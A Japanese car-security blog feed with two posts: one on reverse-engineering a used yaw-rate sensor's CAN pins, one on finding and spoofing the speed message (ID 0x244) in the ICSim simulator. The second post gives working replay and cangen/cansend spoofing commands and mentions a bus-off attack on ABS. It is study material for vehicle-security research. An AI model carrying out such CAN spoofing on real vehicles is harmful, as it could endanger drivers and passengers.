      <description>&lt;p&gt;これまでシミュレーション環境でカーセキュリティの勉強をしていて、その成果は妄想CAN三部作ということで以下の記事にまとめている。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://www.shutingrz.com/post/can-training-first/&#34;&gt;シミュレーション環境でCAN通信を試す&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.shutingrz.com/post/can-training2/&#34;&gt;ドア開錠を行うCAN通信を特定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.shutingrz.com/post/can-training3/&#34;&gt;ECUの車速に関するCANメッセージを特定して騙す&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/br&gt;
車をいじったこともないし持ってすらないのによくここまで続いたなと我ながら思うが、さすがにネタ切れ感もありモチベが保てない。  
&lt;p&gt;そこで実際に車で使われているECUを入手、基板を解析してCANポートのピンアサインを特定し、現実のCAN通信の雰囲気を知ることにした。&lt;/p&gt;
&lt;h1 id=&#34;リアルecuの魅力&#34;&gt;リアルECUの魅力&lt;/h1&gt;
&lt;p&gt;リアルECUはいいぞ。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;本物の車載通信を体感できる&lt;/li&gt;
&lt;li&gt;診断リクエストに答えてくれる(OBD2, KWP2000, UDS&amp;hellip;)&lt;/li&gt;
&lt;li&gt;車と違って場所をとらない（負け惜しみ）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;何よりモチベがあがる。&lt;/p&gt;
&lt;h2 id=&#34;リアルecuのよくないところ&#34;&gt;リアルECUのよくないところ&lt;/h2&gt;
&lt;p&gt;完全にブラックボックスなのでピンアサインからリバーシングする必要がある。&lt;br&gt;
これはある意味面白いが失敗したりわからなかったら絶望。&lt;br&gt;
そして一番大きいのが&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;召喚コストがかかる&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これに尽きる。&lt;/p&gt;
&lt;p&gt;現実世界にECUを召喚するということは、ECUからの通信を物理的に受け取る必要がある。&lt;br&gt;
ECUとCAN通信するために必要なものは記事後半に記載する。&lt;/p&gt;
&lt;h1 id=&#34;ヨーレートセンサーの解析&#34;&gt;ヨーレートセンサーの解析&lt;/h1&gt;
&lt;h2 id=&#34;解析対象&#34;&gt;解析対象&lt;/h2&gt;
&lt;p&gt;
  &lt;img src=&#34;toyota_yaw.png&#34; alt=&#34;toyota_yaw&#34;&gt;
&lt;/p&gt;
&lt;p&gt;というわけでヨーレートセンサーを手に入れた。ヤフオクでコネクタつきで送料込み1800円くらいだった。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;メーカー: デンソー&lt;/li&gt;
&lt;li&gt;型番: 89183-12040&lt;/li&gt;
&lt;li&gt;使用車種: トヨタ レクサス LS460&lt;/li&gt;
&lt;li&gt;端子: 6pin (ピンの接続はブレッドボード用ジャンプワイヤメスが使用可能)&lt;/li&gt;
&lt;li&gt;コネクタ: 90980-12303&lt;br&gt;
住友電装025型TS防水シリーズ6極[横一列]Fコネクタ (6P025WPK-TS-1083-F)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;なぜヨーレートセンサーなのかは記事後半をどうぞ。&lt;/p&gt;
&lt;h2 id=&#34;ピンアサインの推測&#34;&gt;ピンアサインの推測&lt;/h2&gt;
&lt;p&gt;
  &lt;img src=&#34;yaw_pins.png&#34; alt=&#34;yaw_pins&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ヨーレートセンサーを手に入れたのはいいものの、6pinのうちどのピンがIG(イグニッション電源)・GND・CAN-H・CAN-Lなのかは頑張って推測するしかない。&lt;/p&gt;
&lt;p&gt;基板でわかることが多いので、何とかして基板を見てみる。&lt;/p&gt;
&lt;p&gt;本体の表側は硬いプラスチックに覆われており、開けることは不可能な模様（熱や薬品で溶かしたり硬い刃物で切れば行ける気もするが）。&lt;/p&gt;
&lt;p&gt;裏側はプレートがはめ込まれているようで、これはマイナスドライバーでこじ開けることができた。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;yaw_board.png&#34; alt=&#34;yaw_board&#34;&gt;
&lt;/p&gt;
&lt;p&gt;テスタで導通チェックをしたところ、上の大きいポイント6個が端子の6pinの位置と対応していることがわかった。&lt;br&gt;
便宜上、右からpin1～pin6とする。&lt;/p&gt;
&lt;p&gt;このうちpin5、pin6は付属したコネクタにて埋められていることからNCであることがわかる。&lt;br&gt;
この時点で、残りの4pinがIG・GND・CAN-H・CAN-Lのいずれかであることが確定する。&lt;/p&gt;
&lt;p&gt;pin1は基板のグランドへ抜けていることと、テスタで基板の各所に開けられている小さい穴と導通していることを確認したのでGNDとわかる。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;yaw_board_vol.png&#34; alt=&#34;yaw_board_vol&#34;&gt;
&lt;/p&gt;
&lt;p&gt;pin4については、青枠で囲った部分に接続されているように見える。&lt;br&gt;
パターンを追うと最初にコンデンサに接続されており、（多層基板なので完全には追えないが）周囲に3端子レギュレータなど電源回路があることからこの時点でIGでは？と察する。&lt;/p&gt;
&lt;p&gt;pin2, 3は、オレンジ枠で囲った部分に接続されているように見える。&lt;br&gt;
パターンを追うと2つともダイオードに接続されている。&lt;/p&gt;
&lt;p&gt;信号系回路は逆流防止のためにダイオードを挟むので、pin2とpin3はCAN-H、CAN-Lではないかと推測する。 
&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;ここまでくればECUに電源を入れることは可能になる。&lt;br&gt;
ということでpin1とpin4を安定化電源に接続する。（これで火噴いたら推測は間違ってたということで。。）&lt;/p&gt;
&lt;h2 id=&#34;ecuに電源を入れる&#34;&gt;ECUに電源を入れる&lt;/h2&gt;
&lt;p&gt;
  &lt;img src=&#34;yaw_connect.png&#34; alt=&#34;yaw_connect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;電源を入れた。発火する様子はない。&lt;br&gt;
当然ながらLEDなどはないので、これだけでは正常に電源が入ったか判断することはできない。&lt;/p&gt;
&lt;p&gt;ただ、正しく電源が入っているなら、CANポートであるpin2、 pin3にはCAN通信が出ているはず。&lt;/p&gt;
&lt;p&gt;pin2、pin3からCAN通信が出ているのか、そしてそれぞれがCAN-HなのかCAN-Lなのかを調べるにはオシロスコープで波形を見るのが一番いい。&lt;br&gt;
が、そんな高価なものは持っていないのでアナログテスターで電圧を測る。&lt;/p&gt;
&lt;p&gt;pin2を測ると2V付近を指した。CANはドミナントの電圧が2.5Vなので電源がちゃんと入っていることがわかる。ただあまり動きは見られない・・・。&lt;br&gt;
次にpin3を測ると2V付近を指した。じっと待ってると高い電圧のほうにプルプル針が動くことが見えた。CAN-Hっぽい。&lt;/p&gt;
&lt;p&gt;以上の情報から、ピンアサインが大体わかった。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;pin1&lt;/th&gt;
&lt;th&gt;pin2&lt;/th&gt;
&lt;th&gt;pin3&lt;/th&gt;
&lt;th&gt;pin4&lt;/th&gt;
&lt;th&gt;pin5&lt;/th&gt;
&lt;th&gt;pin6&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;GND&lt;/td&gt;
&lt;td&gt;CAN-L&lt;/td&gt;
&lt;td&gt;CAN-H&lt;/td&gt;
&lt;td&gt;IG&lt;/td&gt;
&lt;td&gt;NC&lt;/td&gt;
&lt;td&gt;NC&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;canデバイスにecuを接続&#34;&gt;CANデバイスにECUを接続&lt;/h2&gt;
&lt;p&gt;
  &lt;img src=&#34;yaw_ready.png&#34; alt=&#34;yaw_ready&#34;&gt;
&lt;/p&gt;
&lt;p&gt;受信側のCANデバイスで終端抵抗を入れるようにして、candumpしてみる。&lt;/p&gt;
&lt;p&gt;動画でどうぞ。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;candump.gif&#34; alt=&#34;candump&#34;&gt;
&lt;/p&gt;
&lt;p&gt;いけた！！&lt;/p&gt;
&lt;p&gt;本体を振り回すとそれに合わせてデータが変わることも確認。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;candump_swing.gif&#34; alt=&#34;candump_swing&#34;&gt;
&lt;/p&gt;
&lt;/br&gt;
&lt;p&gt;面白い。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;ecuの入手と選び方&#34;&gt;ECUの入手と選び方&lt;/h1&gt;
&lt;p&gt;今後、私のようにカーセキュリティの勉強をしたい人のために、リアルECUを解析するために必要なことを記載する。&lt;/p&gt;
&lt;h2 id=&#34;ecuとcan通信するために必要なもの&#34;&gt;ECUとCAN通信するために必要なもの&lt;/h2&gt;
&lt;/br&gt;
#### 12V電源 
ECUは車から電源を取る。  
車は現在においては12Vが主流で、ECUも12Vで動く模様。  
自分はAmazonで8000円くらいの直流安定化電源を買った。
&lt;/br&gt;
&lt;h4 id=&#34;canデバイス&#34;&gt;CANデバイス&lt;/h4&gt;
&lt;p&gt;ピンキリで、どこにでも売っているわけではない。&lt;br&gt;
安くて評判がいいのは30ドル程度で売られている &lt;a href=&#34;https://canable.io/&#34;&gt;CANable&lt;/a&gt; というUSB to CAN アダプタだが、海外輸入が必要。&lt;/p&gt;
&lt;p&gt;一応国内Amazonでも中華アダプタは売られていて、ひみつ氏による使えたレビューがある&lt;a href=&#34;https://www.amazon.co.jp/dp/B019A0O9Q6/&#34;&gt;商品&lt;/a&gt;もある。&lt;/p&gt;
&lt;p&gt;自分の場合はAmazonで1個あたり250円で販売されている MCP2515 モジュールを&lt;a href=&#34;https://vimtut0r.com/2017/01/17/can-bus-with-raspberry-pi-howtoquickstart-mcp2515-kernel-4-4-x/&#34;&gt;改造&lt;/a&gt;して Raspberry Pi Zero にSPIで接続している。&lt;br&gt;
が素人にはオススメできない。。。(理由を知りたい方は&lt;a href=&#34;https://twitter.com/shutingrz/status/1154779784183861248&#34;&gt;このツイート&lt;/a&gt;のリプライ参照）&lt;/p&gt;
&lt;/br&gt;
&lt;h4 id=&#34;ecuとcanデバイスを接続するための線コネクタ&#34;&gt;ECUとCANデバイスを接続するための線・コネクタ&lt;/h4&gt;
&lt;p&gt;どのECUにも他のパーツと接続するためのハーネスがあり、そしてコネクタが存在する。&lt;br&gt;

  &lt;img src=&#34;pins.png&#34; alt=&#34;pins&#34;&gt;
&lt;/p&gt;
&lt;p&gt;上はトヨタ車のヨーレートセンサーのピン。幸運にもブレッドボード用のジャンプワイヤを接続可能。&lt;br&gt;
下はスバル車のエアバッグECUのピン。ピンが平たくジャンプワイヤでは接続できず、コネクタが必要になる。&lt;/p&gt;
&lt;p&gt;コネクタはメーカごとに様々なタイプが有るため、慣れないうちはECUに合ったコネクタを用意するよりも最初からコネクタがついているECUを落札したほうがいい。&lt;/p&gt;
&lt;/br&gt;
#### ハードウェアの知識  
&lt;p&gt;これが一番手に入りにくい。&lt;br&gt;
ゼロからハードウェアの勉強をし始めて3ヶ月が経ったが、疑問が無限に湧いてくる。&lt;/p&gt;
&lt;/br&gt;
&lt;h1 id=&#34;ecuの選定&#34;&gt;ECUの選定&lt;/h1&gt;
&lt;p&gt;実は車のECUはヤフオクで大量に流通している。&lt;br&gt;
パーツを選べばそれこそ500円程度(送料別)でECUが手に入るのだ。&lt;/p&gt;
&lt;p&gt;ただ一口にECUといっても、車にはECUの筆頭であるエンジンECUやボディ系ECUのパワーウインドウECU、ドアECUなど数え切れないくらいの種類がある。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;ecus.png&#34; alt=&#34;ecus&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Design Wave Magazine No.104 &amp;ldquo;「クルマ」という名の組み込みシステムPart3&amp;rdquo; P.21&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/br&gt;
&lt;p&gt;この中から安くて良さそうなECUを選ぶわけだが、最初は単機能なものを選ぶべきだと思う。 &lt;br&gt;
自分はディーラーや車検工場でもなく一般市民なので整備マニュアルは持ってないし、ピンアサインが公開されているわけでもないので、有象無象のピンから雰囲気で電源とCAN-H、CAN-Lを推測する必要があるためだ。&lt;/p&gt;
&lt;p&gt;当然ながら複雑なことをするECUほどピンの数が多く、単機能なほど少ないので、ピンを推測する労力を減らすためにぜひ単機能なものを使っていきたい。&lt;/p&gt;
&lt;p&gt;ということでその線で色々探してみたが、車の知識に乏しいこともあり一人ではうまく見つけられなかった。。&lt;/p&gt;
&lt;p&gt;が、私が勝手に師匠と崇めているjptomoya氏から、ヨーレートセンサーがオススメですよというアドバイスを貰えた。&lt;/p&gt;
&lt;h2 id=&#34;ヨーレートセンサーの入手&#34;&gt;ヨーレートセンサーの入手&lt;/h2&gt;
&lt;p&gt;
  &lt;img src=&#34;bosch_yaw.png&#34; alt=&#34;bosch_yaw&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ベンツに搭載されているボッシュのヨーレートセンサー (0 265 005 230)。&lt;br&gt;
ただしコイツはCANに対応していなかった。。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ヨーレートセンサーは横滑り検知のための回転角速度センサーであり、ECUとして以下の特徴を持つ。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安い&lt;/li&gt;
&lt;li&gt;多く流通している&lt;/li&gt;
&lt;li&gt;診断プロトコルに対応&lt;/li&gt;
&lt;li&gt;信号がたくさん出る&lt;/li&gt;
&lt;li&gt;ECU本体を動かせば角速度が変わるので信号データが瞬時に変わる&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;というわけでヨーレートセンサーをヤフオクで入手した。&lt;/p&gt;
&lt;p&gt;検索・購入時に気にしたところは以下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配送先が個人宅に対応しているかどうか&lt;br&gt;
→カーショップが使う運輸業者の制約により、個人宅への配送に対応していない場合がある。&lt;/li&gt;
&lt;li&gt;できればコネクタ付きのものを選ぶ&lt;br&gt;
→コネクタを用意するのは面倒なので。&lt;br&gt;
　さらにコネクタによってはNC(未使用)ピンが埋められている場合があるので、のちにピンアサインを推測するときに該当ピンがNCであるとわかるというメリットもある。&lt;/li&gt;
&lt;li&gt;送料&lt;br&gt;
→ECUは落札・即決価格が安くても送料が高い物が多い。&lt;/li&gt;
&lt;li&gt;「コンピュータ」というキーワードでも検索してみる &lt;br&gt;
→クルマ業界ではECUではなくコンピュータというワードがよく使われている模様。&lt;/li&gt;
&lt;/ul&gt;
&lt;/br&gt;
そして一番大事なのは、そのヨーレートセンサーがCAN通信に対応しているかどうかというところ（**一敗**）。
&lt;p&gt;出品されているECUの型番で調べてもデータシートが存在することは滅多に無いため、そのECUがCAN対応か調査するのは現実的ではない。&lt;br&gt;
しかし大抵のECUは、商品名や説明文にどのクルマから取り出したか書いてある場合が多い。&lt;br&gt;
そのため、取り出し元のクルマがCANに対応しているか調べることで間接的にCAN対応かどうか判断できる。&lt;/p&gt;
&lt;p&gt;どのクルマがCANに対応しているか調べるには、国産車なら以下のページにある ELM327動作確認車両のPDFファイルを確認する。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ganchi.rdy.jp/AppObdInfoSan/car.html&#34;&gt;OBD Info-san! 動作確認済み車両および接続プロトコル&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;接続プロトコルに「TOYOTA CAN」や「ISO  CAN」(ISO 15765)と記載されているものなら恐らくCANに対応している。
「Auto Negotiate」はCANかK-LINEであると思うが、最近のモデルであればCANだと思う。(各メーカごとのK-LINEシェアが下がっている年代から推測すること)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;※同じ車種でも製造年代によって対応していないものもあるので注意&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;※ここらへんは勘なのでもっといいやり方あったら誰か教えて下さい&lt;/strong&gt;&lt;/p&gt;
&lt;/br&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;p&gt;召喚に成功した。&lt;br&gt;
はじめてのECU解析にはヨーレートセンサーがよい。&lt;/p&gt;
&lt;p&gt;このECUを使って色々試していきたい。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>リアルECUを召喚して本物のCAN通信の雰囲気を知る</title>
        <link>https://www.shutingrz.com/post/summon-real-ecu/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>ECUの車速に関するCANメッセージを特定して騙す</title>
      <link>https://www.shutingrz.com/post/can-training3/</link>
      <pubDate>Thu, 25 Jul 2019 04:38:22 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/can-training3/</guid>
      <description>&lt;p&gt;CANの記事も3回目。引き続きシミュレーション環境のICSimでCAN通信の勉強。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.shutingrz.com/post/can-training2/&#34;&gt;前回&lt;/a&gt;はドア開錠メッセージをSavvyCANのOverwrite Modeで特定した。&lt;br&gt;
しかしあの程度ならわざわざSavvyCANを使わずともcansnifferなどでも十分見つけることができる。&lt;/p&gt;
&lt;p&gt;今回は、常に膨大なデータが流れていて普通のCUIでは見つけることが難しそうな車速に関するメッセージを、GUIモニタのSavvyCANならではの機能を使って見つけてみる。&lt;/p&gt;
&lt;p&gt;特定したあとは、実際の速度から別の速度に詐称できないかを試す。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;環境&#34;&gt;環境&lt;/h3&gt;
&lt;p&gt;Ubuntu 19.04 Desktop&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;なぜ車速&#34;&gt;なぜ車速？&lt;/h2&gt;
&lt;p&gt;&lt;del&gt;ICSimじゃこれくらいしかネタがない&lt;/del&gt;　車速を出しているCAN IDを特定し偽装することで、致命的な攻撃を食らわせることができるので。&lt;/p&gt;
&lt;p&gt;例えば電動ルーフは基本的に停車あるいは低速状態のときしか作動しないが、車速を詐称することで高速道路を運転中に突然電動ルーフを開かせることも可能になる。&lt;/p&gt;
&lt;p&gt;その他ADAS（先進運転支援システム）のクルーズコントロールも車速を見ているので、良くないことが起こりそう。&lt;/p&gt;
&lt;h2 id=&#34;車速に関するメッセージについて&#34;&gt;車速に関するメッセージについて&lt;/h2&gt;
&lt;p&gt;そもそもCANバスに車速を直接示すメッセージは流れているのかという話。&lt;/p&gt;
&lt;p&gt;少なくともICSimにはメーター計があるので、何らかの形で速度を割り出すことができているということはわかる。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;icsim_meter.gif&#34; alt=&#34;icsim_meter&#34;&gt;
&lt;/p&gt;
&lt;p&gt;↑　ICSimのcontrolsを起動するとメーター計がブルブル震え始める&lt;/p&gt;
&lt;br/&gt;
&lt;p&gt;インターネッツで調べたところ、現代の車ではCANバスに車速データが流れていることがわかった。&lt;br&gt;
ABS(アンチロック・ブレーキシステム)のECUが以下の流れで車速データを流してくれるらしい。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;各車輪に取り付けられたABS用の車輪速センサーがタイヤの回転数をパルス信号に変換&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;車速パルスをスキッドコントロールコンピュータ (ABSを取り持つECUの名称らしい)が受け取りABSに活かす&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;せっかく車速データを持ってるのでメーターなどのECUのためにCANバスにデジタル変換された車速データを流す&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;（メータや電動ルーフ、カーナビ、ADASはABSから受け取った車速データを使って様々な機能を実現）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;車速を特定する&#34;&gt;車速を特定する&lt;/h1&gt;
&lt;p&gt;CANバスに車速データが流れるであろうことはわかったので、仮定をもとに特定を行う。&lt;/p&gt;
&lt;p&gt;まず、車速の数値とデータフレームの数値が比例する場合、車速が小さい場合はデータフレームの値も小さくなるし、大きい場合はそのようになる。&lt;br&gt;
つまりICSimのcontrolsにて上キーを押し車速を0mphから80mphくらいまで上げ、そのあとキーを離し0mphに戻るまでを記録することで、車速に関するCANIDのデータフレームの折れ線グラフは山なりになるはず。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;関係ないが、速度表示がマイルなのアメリカ感がある&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以上の仮定のもと、次の手順でCAN通信を取得する。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;SavvyCAN・ICSimを起動する&lt;/li&gt;
&lt;li&gt;CANモニタを開始する&lt;/li&gt;
&lt;li&gt;車速を0mph → 80mph → 0mph にする&lt;/li&gt;
&lt;li&gt;CANモニタを停止する&lt;/li&gt;
&lt;li&gt;データのグラフを見る&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;恒例の動画。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;icsim_throttle.gif&#34; alt=&#34;icsim_throttle&#34;&gt;
&lt;/p&gt;
&lt;p&gt;記録後、各CAN IDごとのデータフレームのグラフを見る。&lt;br&gt;
RE ToolsのFrame Data Analysisウインドウで確認することが可能。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Frame Data Analysisはデータ参照時にnull pointerアクセスでクラッシュすることがあるため、事前にFile-&amp;gt;Save Log FileでCANデータを保存しておくことをオススメします&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ウインドウにある各CAN IDをポチポチと見たところ、ID 0x244 にて非常に特徴的なグラフを見ることができた。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;0x244_analysis.png&#34; alt=&#34;0x244_analysis&#34;&gt;
&lt;/p&gt;
&lt;p&gt;右下の Bytes Graphは、データフレームの各バイトがそれぞれ時間ごとにどの数値を示したかを視覚的に確認するためのグラフになっている。&lt;/p&gt;
&lt;p&gt;その中でもData Byte 3のデータが山なりになっていることがすぐにわかる。&lt;/p&gt;
&lt;p&gt;他のCAN IDではこのようなわかりやすい山なりはなかったので、車速に関する情報は 0x244、特に Data Bytes 3ではないかと推測できる。&lt;/p&gt;
&lt;h2 id=&#34;試す&#34;&gt;試す&lt;/h2&gt;
&lt;p&gt;SavvyCANのPlayback機能を使ってリプレイ攻撃を試みる。&lt;/p&gt;
&lt;ol start=&#34;0&#34;&gt;
&lt;li&gt;ICSimのcontrolsを終了しておく&lt;/li&gt;
&lt;li&gt;Send Frames -&amp;gt; Playbackを選択し、Playbackウインドウを出す&lt;/li&gt;
&lt;li&gt;Load Captured Data を選択してキャプチャデータを取り込んでから、 右のID Fillteringリストから 0x244 のみを選択した状態にする&lt;/li&gt;
&lt;li&gt;画面上部の右から二番目にある再生ボタンを押す&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;リプレイ時はキャプチャ時の間隔でCANメッセージを送信するほか、自分で間隔と送信レートを指定することも可能。&lt;/p&gt;
&lt;p&gt;これも動画でどうぞ。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;playback.gif&#34; alt=&#34;playback&#34;&gt;
&lt;/p&gt;
&lt;br/&gt;
&lt;p&gt;0x244をリプレイしたときにICSimのメーターが動いたため、車速データは0x244に含まれることがわかる。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;車速データの値を特定&#34;&gt;車速データの値を特定&lt;/h2&gt;
&lt;p&gt;前項で車速データは0x244にあるとわかった。&lt;br&gt;
もう自明だが車速を司る具体的なバイトを調べる。&lt;/p&gt;
&lt;p&gt;0x244 は 4バイト目、5バイト目の値が変化していることがわかっている。&lt;/p&gt;
&lt;h3 id=&#34;data-byte-3&#34;&gt;Data Byte 3&lt;/h3&gt;
&lt;p&gt;4バイト目である Byte3 のヒストグラムを確認する。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Data Byte 3
                        Changed bits: 0x3f  (00111111)
                        Range: 0x00 to 0x2F
                        Histogram
                                0/0x0 (00000000) -&amp;gt; 20
                                1/0x1 (00000001) -&amp;gt; 220
                                2/0x2 (00000010) -&amp;gt; 28
(snip)
                                44/0x2c (00101100) -&amp;gt; 28
                                45/0x2d (00101101) -&amp;gt; 28
                                46/0x2e (00101110) -&amp;gt; 28
                                47/0x2f (00101111) -&amp;gt; 9
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;車速は 0から80 の範囲で動かしたが、データ上は0x00から0x2Fを示すことがわかる。&lt;/p&gt;
&lt;p&gt;このことから恐らく 0x2F が 80mph付近だろうということでcansendを試す。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cansend vcan0 244#00.00.00.2F.00
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;
  &lt;img src=&#34;cansend.png&#34; alt=&#34;cansend&#34;&gt;
&lt;/p&gt;
&lt;p&gt;予想通りメータは80mph付近を指した。&lt;br&gt;
新しい車速データを送らない限りはICSimのメータ計はその車速を指し続ける模様。&lt;/p&gt;
&lt;h3 id=&#34;data-byte-4&#34;&gt;Data Byte 4&lt;/h3&gt;
&lt;p&gt;
  &lt;img src=&#34;databyte4.png&#34; alt=&#34;databyte4&#34;&gt;
&lt;/p&gt;
&lt;p&gt;先程のByte3は山なりになっていることから車速を示すことがすぐにわかったものの、Byte4 は 0x00 から0xFF をまんべんなく移動しているため、ぱっと見で何も示しているかがよくわからない。&lt;/p&gt;
&lt;p&gt;そこでSavvyCANのFlow Viewウインドウを使って速度との関係性を調査する。&lt;/p&gt;
&lt;p&gt;Flow ViewウインドウではキャプチャしたCAN通信をプレイバックでき、時間軸と各データの流れを視覚的に見られる。&lt;br&gt;
またプレイバック速度も変更できるので、大量のデータでも細かいところまで見られる。&lt;/p&gt;
&lt;p&gt;動画でどうぞ。画面中央のCurrent Valuesに注目。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;flowview.gif&#34; alt=&#34;flowview&#34;&gt;
&lt;/p&gt;
&lt;p&gt;Byte4が0xFFを超えて0x00に戻るとき、Byte3の値が1増加することが見て取れる。&lt;/p&gt;
&lt;p&gt;つまり、Byte4はByte3の下位バイトであり、車速の細かい値の部分を示すことがわかる。&lt;/p&gt;
&lt;h1 id=&#34;車速を詐称してみる&#34;&gt;車速を詐称してみる&lt;/h1&gt;
&lt;p&gt;車速は CANID 0x244 の Byte3, 4で管理していることがわかったので、ここに入れたい速度に対応した値を入れることで車速を詐称することができる。&lt;/p&gt;
&lt;p&gt;詐称には can-utils の cangen を使う。&lt;br&gt;
cangenは指定した間隔で指定したデータ(あるいはランダムデータ)をCANバスに流し続けてくれる。&lt;/p&gt;
&lt;p&gt;送信時は本来の車速データよりも頻繁にデータを送り頑張って競り勝つようにする。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cangen vcan0 -g 1 -I 244 -D 0000002F00 -L 5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;今回は Byte3 に 0x2F を指定しているので 80mph と詐称することになる。&lt;/p&gt;
&lt;p&gt;動画でどうぞ。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;spoof.gif&#34; alt=&#34;spoof&#34;&gt;
&lt;/p&gt;
&lt;p&gt;controlsの0mphの車速メッセージに対抗するように80mphが指し示されている。&lt;br&gt;
しかしながら本来の車速メッセージも流れ続けているので時々0mphを指してしまうことも。&lt;/p&gt;
&lt;p&gt;これを防ぐには、本来のメッセージを出すECUが送信待ちになるような高い頻度でメッセージを出すか、バスオフ攻撃をECUに行いメッセージを出させないようにする必要がある。&lt;/p&gt;
&lt;p&gt;ただ前者はCANバスを専有してしまうことになるし、後者はABS ECUの場合ABS機能が停止することになり非常に危険（攻撃者にとっては一石二鳥ではあるが）。&lt;/p&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;p&gt;SavvyCANの様々な機能を使うことで車速に関するメッセージの特定ができた。&lt;/p&gt;
&lt;p&gt;また、cangenを使って本来の車速メッセージに被せて詐称することもできた。（できたのか？）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;参考情報にSANSのカーハッキングに関するホワイトペーパーがあるが、そこに今回と同じようにメータを詐称している動画が貼られていた。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=QlpTx_LsW7M&#34;&gt;https://www.youtube.com/watch?v=QlpTx_LsW7M&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;この動画は今回の実験とは違い、本来の車速である0mphになることがなく非常にスムーズに車速を詐称できている。&lt;/p&gt;
&lt;p&gt;どうやってるんだろう・・・。&lt;br&gt;
（イグニッション電源が入ってなく本来の車速メッセージが流れていない可能性はある）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;シミュレーション環境(ICSim)でできることは一通りやった気がする。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ブリブリ鳴るのは故障じゃなくて、ABSのカラクリ&lt;br&gt;
&lt;a href=&#34;https://monoist.atmarkit.co.jp/mn/articles/1007/29/news102.html&#34;&gt;https://monoist.atmarkit.co.jp/mn/articles/1007/29/news102.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;スピードメーターを動かすのはABS システム&lt;br&gt;
&lt;a href=&#34;http://www.jaspa-oita.or.jp/jissen/2016/09/page1_1.html&#34;&gt;http://www.jaspa-oita.or.jp/jissen/2016/09/page1_1.html&lt;/a&gt;&lt;/li&gt;
